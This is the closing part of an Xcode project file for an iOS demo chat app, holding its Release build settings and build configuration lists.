				DEVELOPMENT_TEAM = 2XMPHHJW2J;
				ENABLE_BITCODE = NO;
				FRAMEWORK_SEARCH_PATHS = (
					"$(inherited)",
					"$(PROJECT_DIR)",
				);
				INFOPLIST_FILE = "Chat-Demo-IOS/Info.plist";
				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.1;
				PRODUCT_BUNDLE_IDENTIFIER = com.norgic.ios.chat;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		5D57DAC02642964700515FEA /* Build configuration list for PBXProject "Chat-Demo-IOS" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				5D57DAD72642964800515FEA /* Debug */,
				5D57DAD82642964800515FEA /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		5D57DAD92642964800515FEA /* Build configuration list for PBXNativeTarget "Chat-Demo-IOS" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				5D57DADA2642964800515FEA /* Debug */,
				5D57DADB2642964800515FEA /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 5D57DABD2642964700515FEA /* Project object */;
}
